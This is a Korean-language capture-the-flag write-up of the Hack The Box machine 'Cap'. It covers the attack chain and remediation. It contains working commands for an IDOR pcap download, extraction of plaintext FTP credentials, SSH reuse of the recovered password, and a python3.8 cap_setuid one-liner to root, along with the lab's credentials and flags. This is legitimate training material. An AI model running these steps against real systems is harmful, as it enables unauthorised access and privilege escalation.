# A. 작성 전 증적 감사

**종합 판정: READY**

머신명(Cap), 대상 IP(`10.129.8.179`), 공격 체인(포트 스캔 → 웹 대시보드 IDOR로 과거 pcap 획득 → pcap 내 평문 FTP 자격 증명 추출 → SSH 자격 증명 재사용으로 User 획득 → `python3.8` 바이너리의 `cap_setuid` capability로 root 획득)이 처음부터 끝까지 일관되며, 각 전환 단계에 원본 로그 형태의 직접 증적이 존재한다.

## 1. 차단 항목

없음.

## 2. 경고 항목

1. `/data/<id>` 라우트 자체는 실제 파일을 내려주지 않고 HTML 요약 페이지만 반환한다는 점을 처음에 오해했다. 실제 취약한 엔드포인트는 페이지 내부의 "Download" 버튼이 가리키는 `/download/<id>`이다. 본문에서 이 차이를 명확히 구분해 서술한다.
2. `getcap -r /` 실행 전에 `sudo -l`을 먼저 시도하다 `nathan` 계정의 sudo 비밀번호를 몰라 3회 실패했다. 계정 잠금이나 추가 영향은 없었음을 로그(E11)로 확인했으며, 이는 실패한 접근으로 12절에 기록한다.

## 3. 자동 정규화 항목

- 대상 IP `10.129.8.179`는 본문에서 `$TARGET`으로 표기한다.
- 공격자 VPN IP `10.10.15.38`은 본문에서 `$LHOST`로 표기한다.

## 4. 자료 목록

- `scans/E01_nmap_full_tcp.txt`, `scans/E02_nmap_top3_service.txt` — nmap 원본
- `http/E03_http_root.txt` ~ `http/E09_download0_headers.txt`, `http/E09_0.pcap` — 웹 IDOR 원본 요청/응답 및 획득한 pcap 파일
- `logs/E10_ssh_nathan_login.log` — SSH User 접근 및 user flag
- `logs/E11_privesc_enum.log` — capability 열거
- `logs/E12_privesc_root.log` — root 권한 상승 및 root flag
- `loot/flags.md` — 획득한 flag 및 자격 증명 (PRIVATE_STUDY)

## 5. 공격 체인 완전성 표

| 단계 | 주장 | 필요 증적 | 확인된 증적 | 상태 |
|------|------|-----------|--------------|------|
| 열거 | 21/22/80만 open, 웹앱은 gunicorn 기반 "Security Dashboard" | 포트/서비스 스캔 | E01, E02 | 확인됨 |
| 취약점 발견 | `/download/<id>`가 id 값을 검증하지 않는 IDOR | 요청/응답 원본 | E03~E09 | 확인됨 |
| 초기 접근 (자격 증명 획득) | 과거 pcap에 평문 FTP `USER`/`PASS` 포함 | pcap 분석 결과 | E09b | 확인됨 |
| 사용자 권한 | 동일 자격 증명으로 SSH 로그인, uid=1001(nathan) | SSH 세션 로그 | E10 | 확인됨 |
| 권한 상승 열거 | `python3.8`에 `cap_setuid+eip` 부여됨 | `getcap` 출력 | E11 | 확인됨 |
| root 최종 검증 | `os.setuid(0)` 후 `id`가 uid=0(root) | 권한 상승 세션 로그 | E12 | 확인됨 |

## 6. 이미지/증적 경로 검사

이미지 증적 없음(전 과정 텍스트 로그/원본 응답으로만 증적 확보).

## 7. 세션 종속 값 및 민감 정보 검사

- `$TARGET`(10.129.8.179), `$LHOST`(10.10.15.38)는 본 세션 한정 값으로 표시했다.
- 획득한 자격 증명(`nathan` / `Buck3tH4TF0RM3!`)은 PRIVATE_STUDY 모드이므로 `loot/flags.md`에 기록했다. VPN 프로필 내용 자체는 기록하지 않았다.

## 8. 취약점 분류 검사

- IDOR(`/download/<id>`): 자체 구현 결함, CWE-639(Authorization Bypass Through User-Controlled Key) — `[추론]`, 공식 매핑은 재확인 필요.
- 평문 FTP로 인한 자격 증명 노출: 위험한 서비스 구성.
- FTP→SSH 자격 증명 재사용: 자격 증명 재사용/운영 보안 실패.
- `python3.8`에 부여된 `cap_setuid`: 위험한 서비스(바이너리) 구성 — 불필요하게 강력한 Linux capability 부여.
- 공개 CVE 아님, 임의 CVSS 부여하지 않음.

## 9. 스크립트 존재 여부

본문에서 언급하는 스크립트는 실제 실행한 curl/tshark/python one-liner 명령뿐이며 별도 파일로 저장한 공격 스크립트는 없다. 부록 A는 "해당 없음"으로 남긴다.

## 10. 추가로 필요한 증적

없음. 초기 접근부터 root 검증까지 직접 증적이 모두 확보되었다.

---

# B. 최종 Write-up

```yaml
---
title: "HTB Cap Write-up"
machine: "Cap"
platform: "Hack The Box"
os: "Linux"
difficulty: "Easy"
date_started: "2026-08-14"
date_completed: "2026-08-14"
writeup_mode: "PRIVATE_STUDY"
status: "Completed"
tags:
  - htb
  - cybersecurity
  - writeup
---
```

# HTB Cap Write-up

## 0. 문서 범위 및 주의사항

이 문서는 사용자가 명시적으로 지정한 HTB 머신 `Cap`(대상: `$TARGET`)에 대한 개인 학습용 풀이 기록이다. 해당 랩 환경 외의 시스템은 다루지 않는다. `writeup_mode: PRIVATE_STUDY`이므로 획득한 flag와 자격 증명을 `loot/flags.md`에 별도 보관한다.

## 1. 개요

Cap은 HTB의 Easy 난이도 Linux 머신이다. 웹으로 노출된 "Security Dashboard"(Flask/gunicorn)에는 네트워크 캡처(pcap) 파일을 다운로드하는 기능이 있는데, 다운로드 URL의 캡처 ID를 사용자가 임의로 조작할 수 있는 IDOR(Insecure Direct Object Reference) 결함이 있다. 이를 통해 관리자가 초기 설정 중 남긴 과거 pcap을 내려받으면, 그 안에 평문 FTP 인증 정보가 그대로 담겨 있다. 이 자격 증명은 시스템 SSH 계정에도 재사용되고 있어 바로 사용자 권한을 얻을 수 있으며, 이후 `python3.8` 바이너리에 부여된 `cap_setuid` Linux capability를 이용해 즉시 root 권한으로 전환할 수 있다.

## 2. 공격 흐름

```mermaid
flowchart LR
    A[포트 스캔] --> B["gunicorn 웹 대시보드 확인"]
    B --> C["/capture -> /data/id -> /download/id 구조 파악"]
    C --> D["id=0으로 IDOR: 과거 pcap 획득"]
    D --> E["pcap에서 평문 FTP nathan 계정 자격 증명 추출"]
    E --> F["SSH 자격 증명 재사용 -> User(nathan)"]
    F --> G["getcap로 python3.8의 cap_setuid 확인"]
    G --> H["os.setuid(0)으로 root 전환, root flag 획득"]
```

한 줄 공격 체인: 웹 IDOR(`/download/<id>`) → 과거 pcap 속 평문 FTP 자격 증명 → SSH 재사용(User) → `python3.8` `cap_setuid` 악용(Root).

## 3. 실습 환경

- `$TARGET` = `10.129.8.179`
- `$DOMAIN` = 해당 없음
- `$LHOST` = `10.10.15.38` (HTB Machines VPN, AU Machines 2, `tun0`)
- 사용 도구: `nmap` 7.99, `curl`, `tshark`/`strings`, `ssh`, `expect`(세션 자동화 및 로그 캡처용)

## 4. 공격 표면 요약

- 21/tcp FTP (vsftpd 3.0.3)
- 22/tcp SSH (OpenSSH 8.2p1 Ubuntu)
- 80/tcp HTTP (gunicorn, Flask 기반 "Security Dashboard")

## 5. 정보 수집

### 목표

노출된 서비스와 웹 애플리케이션의 기능 구조를 파악한다.

### 검증 명령 또는 요청

```bash
nmap -sT -p- --min-rate 3000 -Pn $TARGET
nmap -sT -sV -sC -p 21,22,80 -Pn $TARGET
curl -i http://$TARGET/
curl -i http://$TARGET/capture
```

### 핵심 결과

```text
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
```

`/` 페이지 사이드바에 `Dashboard`, `Security Snapshot (5 Second PCAP + Analysis)`(`/capture`), `IP Config`(`/ip`), `Network Status`(`/netstat`) 메뉴가 있고, 사용자명이 "Nathan"으로 표시된다. `/capture`는 `/data/1`로 302 리다이렉트된다.

### 성공 판정

세 서비스와 웹앱의 라우트 구조(`/capture`, `/data/<id>`)를 원본 응답으로 확인했다.

### 해석과 다음 결정

`/data/<id>`의 실제 내용을 확인해 다운로드 로직을 파악한다.

### 증적

E01, E02, E03, E04

## 6. 초기 접근

### 목표

`/data/<id>` 및 실제 다운로드 라우트가 캡처 ID에 대한 소유권/인가 검증을 하는지 확인한다.

### 관찰 및 가설

`/data/1`(정상 흐름에서 리다이렉트된 대상)의 응답 본문을 열어보니 실제 파일이 아니라 캡처 요약을 보여주는 HTML 페이지였고, 그 안에 다음 버튼이 있었다.

```html
<button class="btn btn-info" onclick="location.href='/download/1'">Download</button>
```

즉 실제 바이너리 다운로드는 `/download/<id>`이며, `<id>`가 세션이나 소유권과 무관하게 그대로 파일 조회에 쓰인다면 다른 사용자(관리자)가 과거에 생성한 캡처도 열람할 수 있으리라는 가설을 세웠다.

### 검증 명령 또는 요청

```bash
curl -s -D headers.txt "http://$TARGET/download/0" -o 0.pcap
file 0.pcap
```

### 핵심 결과

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=0.pcap
Content-Type: application/vnd.tcpdump.pcap
Content-Length: 9935
Last-Modified: Sat, 15 May 2021 19:53:54 GMT
```

`file` 명령으로 실제 유효한 pcap 캡처 파일(2021-05-15 작성)임을 확인했다. 세션 쿠키 없이 요청했음에도(E07, E08) 동일하게 성공해, 인증/세션/소유권 검증이 전혀 없음을 확인했다.

### 성공 판정

단순 200 응답이 아니라 `Content-Disposition`, 파일 시그니처(`file` 명령), 실제 오래된 `Last-Modified` 타임스탬프로 "타인(관리자)의 과거 데이터에 대한 무인가 접근"이라는 실질적 영향을 확인했다.

### 취약점 원인과 공격 조건

- 원인: 다운로드 라우트가 캡처 ID를 요청자의 세션/소유권과 대조하지 않고 그대로 파일 조회 키로 사용함.
- 공격 조건: 웹 서비스에 접근 가능하고 정수 ID를 추측/열거할 수 있으면 별도 인증 없이 성립.
- 분류: IDOR(CWE-639 후보, `[추론]`).

### 해석과 다음 결정

확보한 pcap 내부에 자격 증명 등 민감 정보가 있는지 분석한다.

### 증적

E05, E06, E07, E08, E09

---

### 목표

획득한 `0.pcap` 안에서 인증 정보나 이후 접근에 쓸 만한 정보를 찾는다.

### 검증 명령 또는 요청

```bash
tshark -r 0.pcap -Y ftp -T fields -e ip.src -e ip.dst -e ftp.request.command -e ftp.request.arg
strings 0.pcap | grep -iE '^(USER|PASS) '
```

### 핵심 결과

```text
USER nathan
PASS Buck3tH4TF0RM3!
```

FTP 세션에서 `nathan` 계정의 평문 비밀번호가 그대로 캡처되어 있었고, 이어서 `RETR notes.txt` 요청도 확인됐다(파일 내용 자체는 본 풀이에서 추가로 내려받지 않음).

### 성공 판정

패킷 페이로드에서 직접 `USER`/`PASS` 커맨드 라인을 확인했으므로 확실한 자격 증명 노출로 판정한다.

### 취약점 원인과 공격 조건

- 원인: FTP는 기본적으로 인증 정보를 평문으로 전송하며, 이 트래픽이 캡처되어 웹앱을 통해 재노출됨.
- 분류: 위험한 서비스 구성(평문 인증 프로토콜) + 정보 노출.

### 해석과 다음 결정

이 자격 증명이 시스템 계정(SSH)에도 재사용되는지 검증한다.

### 증적

E09b

---

### 목표

`nathan` / `Buck3tH4TF0RM3!` 자격 증명이 SSH에서도 유효한지 확인하고, 유효하면 실제 셸 권한을 검증한다.

### 검증 명령 또는 요청

```bash
ssh nathan@$TARGET
# password: Buck3tH4TF0RM3!
id
hostname
pwd
cat user.txt
```

### 핵심 결과

```text
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
hostname: cap
pwd: /home/nathan
user.txt: ea2a0b3322200cb4eda1fd5809e2f43d
```

### 성공 판정

`id` 출력의 `uid=1001(nathan)`로 실제 인증 성공과 셸 권한을 직접 확인했고, `user.txt`를 읽어 user flag를 획득했다.

### 취약점 원인과 공격 조건

- 분류: 자격 증명 재사용(운영 보안 실패) — FTP용으로 노출된 비밀번호가 시스템 로그인 계정에도 그대로 사용됨.

### 해석과 다음 결정

User 권한을 얻었으므로 root로 가는 권한 상승 경로를 열거한다.

### 증적

E10

## 7. 사용자 권한 획득

6절의 SSH 접근 단계에서 이미 `nathan`(uid=1001) 사용자 권한을 직접 검증했다(증적 E10). 별도의 추가 단계 없음.

## 8. 권한 상승 열거

### 목표

`nathan` 권한에서 root로 갈 수 있는 벡터를 찾는다.

### 관찰 및 가설

`sudo -l`은 비밀번호를 요구했고 알고 있는 비밀번호로는 통과하지 못했다(E11 상단, 실패). Linux capability가 부여된 바이너리를 찾는 편이 더 가능성이 높다고 판단했다.

### 검증 명령 또는 요청

```bash
getcap -r / 2>/dev/null
```

### 핵심 결과

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

`/usr/bin/python3.8`에 `cap_setuid+eip`(effective, inheritable, permitted)가 부여되어 있다. 이는 이 바이너리로 실행되는 프로세스가 `setuid()` 시스템 콜을 호출해 임의의 uid로 전환할 수 있음을 의미한다.

### 성공 판정

`getcap` 원본 출력에서 `cap_setuid`를 직접 확인했으므로 유효한 권한 상승 벡터로 판정한다.

### 취약점 원인과 공격 조건

- 원인: 표준 인터프리터 바이너리(`python3.8`)에 불필요하게 `cap_setuid` capability가 부여됨.
- 공격 조건: 해당 바이너리를 실행할 수 있는 로컬 사용자 권한만 있으면 됨(추가 인증 불필요).
- 분류: 위험한 서비스(바이너리) 구성.

### 해석과 다음 결정

Python에서 `os.setuid(0)`을 호출해 실제로 root 권한을 얻을 수 있는지 검증한다.

### 증적

E11

## 9. 권한 상승

### 목표

`python3.8`의 `cap_setuid`를 이용해 실제로 root 권한을 획득하고 이를 직접 증적으로 검증한다.

### 검증 명령 또는 요청

```bash
python3.8 -c 'import os; os.setuid(0); os.system("id")'
python3.8 -c 'import os; os.setuid(0); os.system("cat /root/root.txt")'
```

### 핵심 결과

```text
uid=0(root) gid=1001(nathan) groups=1001(nathan)
cf0898973b65f62ce18e511fb228163e
```

### 성공 판정

`id` 출력이 `uid=0(root)`임을 직접 확인했고(단순 셸 연결이나 명령 실행 성공이 아니라 실제 uid 전환을 확인), 이어서 `/root/root.txt`를 읽어 root flag를 획득했다.

### 취약점 원인과 공격 조건

8절과 동일: `python3.8`에 부여된 `cap_setuid` capability.

### 해석과 다음 결정

초기 접근부터 root까지 전체 공격 체인이 완결되었다.

### 증적

E12

## 10. 권한 및 신뢰 경계 전환

| 전환 | 방법 | 근거 |
|------|------|------|
| 미인증(웹) → 정보 노출(pcap) | IDOR(`/download/0`) | E09 |
| 정보 노출 → User(nathan, SSH) | 자격 증명 재사용 | E09b, E10 |
| User(nathan) → root | Linux capability(`cap_setuid`) 오용 | E11, E12 |

## 11. 취약점 요약

| 항목 | 내용 |
|------|------|
| 취약점 1 | 웹 대시보드 `/download/<id>` IDOR — 소유권 검증 없이 임의 캡처 파일 열람 가능 |
| 취약점 2 | 평문 FTP로 인한 자격 증명 노출 및 시스템 계정 재사용 |
| 취약점 3 | `python3.8`에 부여된 `cap_setuid` capability로 인한 로컬 권한 상승 |
| CVE | 해당 없음(공개 CVE 아님) |
| CWE 후보 | CWE-639(IDOR), CWE-522(Insufficiently Protected Credentials) — `[추론]`, 공식 매핑 미확인 |
| 영향 | 원격 미인증 정보 노출 → SSH User 권한 → 로컬 root 권한 상승 |
| 증적 | E01~E12 |

## 12. 실패한 접근과 트러블슈팅

- `sudo -l` 시도 시 `nathan`의 sudo 비밀번호를 몰라 3회 연속 실패했다(계정 잠금이나 다른 부작용 없음, E11 로그 상단). 이 실패로 인해 sudo 경로 대신 `getcap` 기반 capability 열거로 전환했고, 그것이 실제 권한 상승 경로였다.

## 13. 실습 중 생성한 흔적과 정리

- 대상 시스템에 파일을 생성하거나 계정/키/크론을 추가하지 않았다. SSH 로그인 후 `id`, `hostname`, `pwd`, `cat`, `getcap`, 그리고 `python3.8 -c` 두 줄짜리 권한 상승 명령만 실행했다.
- 로컬(Kali WSL)에서 다운로드한 `0.pcap`은 `C:\HTB\Cap\http\E09_0.pcap`에 정식 증적으로 보존한다.

## 14. 탐지 및 대응

- 근본 원인 1(IDOR): 캡처 다운로드 라우트가 요청자의 세션/소유권을 검증하지 않음.
  - 단기 완화: 캡처 ID 앞에 인증 및 소유권 검사(현재 로그인 사용자가 생성한 캡처인지)를 추가.
  - 근본 수정: 예측 가능한 정수 ID 대신 사용자별 스코프가 적용된 UUID 등을 사용하고, 서버 측에서 접근 제어 목록을 강제.
- 근본 원인 2(평문 FTP): vsftpd가 암호화 없이 인증 정보를 주고받음.
  - 단기 완화: FTP 대신 SFTP/FTPS로 전환하거나 최소한 해당 서비스 접근을 내부망으로 제한.
  - 근본 수정: 평문 FTP 서비스 자체를 제거.
- 근본 원인 3(cap_setuid): 인터프리터 바이너리에 과도한 capability 부여.
  - 단기 완화: `setcap -r /usr/bin/python3.8`로 capability 제거.
  - 근본 수정: 특정 작업에만 필요한 최소 권한으로 별도 wrapper/서비스 계정을 구성하고, 범용 인터프리터에는 강력한 capability를 부여하지 않는다.
- 탐지 가능한 흔적: `/download/<id>` 요청 로그에서 짧은 시간에 여러 낮은 정수 ID를 순차 요청하는 패턴(IDOR 스캐닝), SSH 로그에서 FTP 자격 증명과 동일한 계정의 로그인, `auditd`로 `python3.8`이 `setuid` 계열 syscall을 호출하는 이벤트.

## 15. 핵심 학습 포인트

1. 웹앱에서 다운로드/조회용 URL에 정수 ID가 그대로 노출되면 우선 인접 값(0, 1, 2 등)으로 IDOR 여부를 시험해볼 가치가 있다.
2. 클라이언트에 보이는 라우트(`/data/<id>`)와 실제 자원을 반환하는 라우트(`/download/<id>`)가 다를 수 있으므로, 페이지 본문 안의 버튼/링크까지 확인해야 한다.
3. 평문 프로토콜(FTP, telnet 등) 캡처는 자격 증명이 그대로 노출되는 가장 확실한 정보원 중 하나다.
4. 노출된 자격 증명은 원래 서비스(FTP)뿐 아니라 SSH 등 다른 서비스에도 재사용되는지 항상 시험해야 한다.
5. `getcap -r /`은 SUID만 보는 `find -perm -4000`보다 Linux capability 기반 권한 상승 벡터를 찾는 데 필수적이다.
6. `cap_setuid`가 부여된 인터프리터(python, perl 등)가 있으면 `os.setuid(0)` 한 줄로 즉시 root 전환이 가능하다.
7. `sudo -l` 실패가 곧 권한 상승 불가를 의미하지 않는다 — capability, cron, SUID 등 다른 벡터를 계속 확인해야 한다.

## 16. 참고 자료

외부 CVE/보안 공지 검증이 필요하지 않았다(공개 CVE 아님, 자체 구성 결함). Linux capabilities의 `cap_setuid` 의미는 표준 `capabilities(7)` man page 정의에 부합하는 것으로 관찰했다 — `[외부 검증 필요 — 공식 man page 원문 대조는 본 세션에서 수행하지 않음]`.

## 부록 A. 사용한 스크립트

해당 없음. 표준 도구(nmap, curl, tshark, strings, ssh)와 인라인 python one-liner만 사용했으며 별도 파일로 저장한 스크립트는 없다.

## 부록 B. 원본 스캔 및 응답

- `scans/E01_nmap_full_tcp.txt`
- `scans/E02_nmap_top3_service.txt`
- `http/E03_http_root.txt` ~ `http/E09_download0_headers.txt`, `http/E09_0.pcap`
- `logs/E10_ssh_nathan_login.log`
- `logs/E11_privesc_enum.log`
- `logs/E12_privesc_root.log`

## 부록 C. 증적 목록

`notes/evidence-index.md` 참고.
